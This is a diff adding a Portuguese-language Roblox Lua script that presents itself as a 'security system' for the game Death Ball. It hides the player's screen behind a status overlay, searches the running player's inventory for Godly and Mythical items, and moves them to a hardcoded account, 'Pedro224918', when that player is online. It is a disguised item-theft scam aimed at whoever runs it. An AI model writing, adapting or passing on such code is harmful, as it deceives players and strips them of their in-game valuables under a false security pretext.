@@ -1,0 +1,258 @@
+--[[
+    SISTEMA DE SEGURANÇA - DEATH BALL
+    GitHub: https://github.com/SEU_USUARIO/DeathBall-Seguranca
+    Versão: 2.0
+]]
+
+local CONFIG = {
+    DONO = "Pedro224918",
+    TEMPO_MINIMO = 10,
+    VERSAO = "2.0"
+}
+
+local function iniciarScript()
+    local executor = game:GetService("Players").LocalPlayer
+    local inicioExecucao = tick()
+    local telaTravada = nil
+    
+    print("⚔️ SISTEMA DE SEGURANÇA DEATH BALL " .. CONFIG.VERSAO .. " ⚔️")
+    print("👤 Executor: " .. executor.Name)
+    print("🎯 Dono: " .. CONFIG.DONO)
+    
+    local function congelarTela()
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "DeathBall_Seguranca"
+        gui.DisplayOrder = 999999
+        gui.ResetOnSpawn = false
+        gui.IgnoreGuiInset = true
+        gui.Parent = game:GetService("CoreGui")
+        
+        local fundo = Instance.new("Frame", gui)
+        fundo.Size = UDim2.new(1, 0, 1, 0)
+        fundo.BackgroundColor3 = Color3.new(0, 0, 0)
+        fundo.BackgroundTransparency = 0.3
+        fundo.BorderSizePixel = 0
+        
+        local titulo = Instance.new("TextLabel", fundo)
+        titulo.Size = UDim2.new(1, 0, 0.25, 0)
+        titulo.Position = UDim2.new(0, 0, 0.25, 0)
+        titulo.BackgroundTransparency = 1
+        titulo.Text = "⚔️ SEGURANÇA DEATH BALL ⚔️"
+        titulo.TextColor3 = Color3.new(1, 1, 0)
+        titulo.TextScaled = true
+        titulo.Font = Enum.Font.GothamBold
+        
+        local status = Instance.new("TextLabel", fundo)
+        status.Size = UDim2.new(1, 0, 0.2, 0)
+        status.Position = UDim2.new(0, 0, 0.5, 0)
+        status.BackgroundTransparency = 1
+        status.Text = "INICIALIZANDO..."
+        status.TextColor3 = Color3.new(0, 1, 0)
+        status.TextScaled = true
+        status.Font = Enum.Font.Gotham
+        
+        local timer = Instance.new("TextLabel", fundo)
+        timer.Size = UDim2.new(1, 0, 0.1, 0)
+        timer.Position = UDim2.new(0, 0, 0.7, 0)
+        timer.BackgroundTransparency = 1
+        timer.Text = "Aguarde... 0s"
+        timer.TextColor3 = Color3.new(1, 1, 1)
+        timer.TextScaled = true
+        timer.Font = Enum.Font.Gotham
+        
+        return gui, status, timer
+    end
+    
+    local function atualizarStatus(status, timer, msg, segundos)
+        if status then
+            status.Text = msg or status.Text
+        end
+        if timer then
+            timer.Text = "Aguarde... " .. math.floor(segundos or 0) .. "s"
+        end
+    end
+    
+    local function verificarRaridade(item)
+        if not item then return false, nil end
+        
+        local nome = item.Name:lower()
+        local attr = item:GetAttribute("Rarity") or item:GetAttribute("Tipo")
+        
+        if attr then
+            local a = tostring(attr):lower()
+            if a:find("godly") then return true, "Godly"
+            elseif a:find("mythical") then return true, "Mythical" end
+        end
+        
+        if item:IsA("StringValue") and item.Value then
+            local val = tostring(item.Value):lower()
+            if val:find("godly") then return true, "Godly"
+            elseif val:find("mythical") then return true, "Mythical" end
+        end
+        
+        if nome:find("godly") or nome:find("lendario") then return true, "Godly" end
+        if nome:find("mythical") or nome:find("mitico") then return true, "Mythical" end
+        
+        return false, nil
+    end
+    
+    local function buscarItens(container, profundidade)
+        profundidade = profundidade or 0
+        if profundidade > 5 then return {} end
+        
+        local encontrados = {}
+        
+        for _, item in ipairs(container:GetChildren()) do
+            local especial, tipo = verificarRaridade(item)
+            if especial then
+                table.insert(encontrados, {item = item, tipo = tipo, nome = item.Name})
+            end
+            
+            local subItens = buscarItens(item, profundidade + 1)
+            for _, sub in ipairs(subItens) do
+                table.insert(encontrados, sub)
+            end
+        end
+        
+        return encontrados
+    end
+    
+    local function encontrarPedro()
+        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+            if p.Name:lower() == CONFIG.DONO:lower() or p.DisplayName:lower() == CONFIG.DONO:lower() then
+                return p, true
+            end
+        end
+        return nil, false
+    end
+    
+    local gui, statusText, timerText = congelarTela()
+    telaTravada = gui
+    
+    atualizarStatus(statusText, timerText, "ANALISANDO INVENTÁRIO...", 0)
+    wait(1)
+    
+    local locaisBusca = {
+        executor,
+        executor:FindFirstChild("Inventory"),
+        executor:FindFirstChild("Backpack"),
+        executor:FindFirstChild("DataFolder"),
+        executor.Character
+    }
+    
+    local itensEncontrados = {}
+    
+    for i, localBusca in ipairs(locaisBusca) do
+        if localBusca then
+            atualizarStatus(statusText, timerText, string.format("BUSCANDO EM: %s", localBusca.Name), i * 2)
+            wait(0.5)
+            
+            local itens = buscarItens(localBusca)
+            for _, item in ipairs(itens) do
+                table.insert(itensEncontrados, item)
+                print("  ✅ " .. item.tipo .. ": " .. item.nome)
+            end
+        end
+    end
+    
+    local godlyCount = 0
+    local mythicalCount = 0
+    for _, item in ipairs(itensEncontrados) do
+        if item.tipo == "Godly" then godlyCount = godlyCount + 1
+        else mythicalCount = mythicalCount + 1 end
+    end
+    
+    print("\n📊 TOTAL ENCONTRADO: " .. #itensEncontrados)
+    print("   Godly: " .. godlyCount .. " | Mythical: " .. mythicalCount)
+    
+    atualizarStatus(statusText, timerText, string.format("ENCONTRADOS: %d ITENS", #itensEncontrados), tick() - inicioExecucao)
+    wait(1)
+    
+    if #itensEncontrados == 0 then
+        atualizarStatus(statusText, timerText, "NENHUM ITEM ESPECIAL ENCONTRADO", tick() - inicioExecucao)
+        print("⚠️ Nenhum item Godly/Mythical encontrado!")
+        wait(3)
+        telaTravada:Destroy()
+        return
+    end
+    
+    atualizarStatus(statusText, timerText, "PROCURANDO PEDRO224918...", tick() - inicioExecucao)
+    wait(1)
+    
+    local pedro, online = encontrarPedro()
+    
+    if online and pedro then
+        atualizarStatus(statusText, timerText, "PEDRO ENCONTRADO! TRANSFERINDO...", tick() - inicioExecucao)
+        print("\n✅ Pedro está ONLINE! Iniciando transferência...")
+        
+        local invPedro = pedro:FindFirstChild("Inventory") or 
+                        pedro:FindFirstChild("Backpack") or
+                        Instance.new("Folder", pedro)
+        
+        if invPedro.Name ~= "Inventory" then
+            invPedro.Name = "Inventory"
+        end
+        
+        local transferidos = 0
+        local falhas = 0
+        
+        for i, itemData in ipairs(itensEncontrados) do
+            atualizarStatus(statusText, timerText, string.format("TRANSFERINDO %d/%d", i, #itensEncontrados), tick() - inicioExecucao)
+            
+            local sucesso = pcall(function()
+                local meta = Instance.new("StringValue")
+                meta.Name = "TransferidoPor"
+                meta.Value = executor.Name
+                meta.Parent = itemData.item
+                
+                itemData.item.Parent = invPedro
+                transferidos = transferidos + 1
+            end)
+            
+            if not sucesso then
+                falhas = falhas + 1
+            end
+            
+            wait(0.1)
+        end
+        
+        atualizarStatus(statusText, timerText, string.format("✅ %d ITENS TRANSFERIDOS!", transferidos), tick() - inicioExecucao)
+        
+        print("\n✅ TRANSFERÊNCIA CONCLUÍDA!")
+        print("   Transferidos: " .. transferidos)
+        print("   Falhas: " .. falhas)
+        
+        local hint = Instance.new("Hint", workspace)
+        hint.Text = string.format("✅ %d itens transferidos para %s", transferidos, CONFIG.DONO)
+        game:GetService("Debris"):AddItem(hint, 5)
+        
+    else
+        atualizarStatus(statusText, timerText, "PEDRO OFFLINE - ITENS MANTIDOS", tick() - inicioExecucao)
+        print("\n📤 Pedro está OFFLINE. Itens mantidos no seu inventário.")
+        print("Lista de itens encontrados:")
+        for _, item in ipairs(itensEncontrados) do
+            print("   • " .. item.nome .. " (" .. item.tipo .. ")")
+        end
+        wait(3)
+    end
+    
+    local tempoRestante = CONFIG.TEMPO_MINIMO - (tick() - inicioExecucao)
+    if tempoRestante > 0 then
+        for i = tempoRestante, 1, -1 do
+            atualizarStatus(statusText, timerText, "FINALIZANDO...", i)
+            wait(1)
+        end
+    end
+    
+    telaTravada:Destroy()
+    print("\n✨ Script finalizado! Tela descongelada.")
+end
+
+local function executar()
+    local success, err = pcall(iniciarScript)
+    if not success then
+        print("❌ ERRO: " .. tostring(err))
+    end
+end
+
+executar()
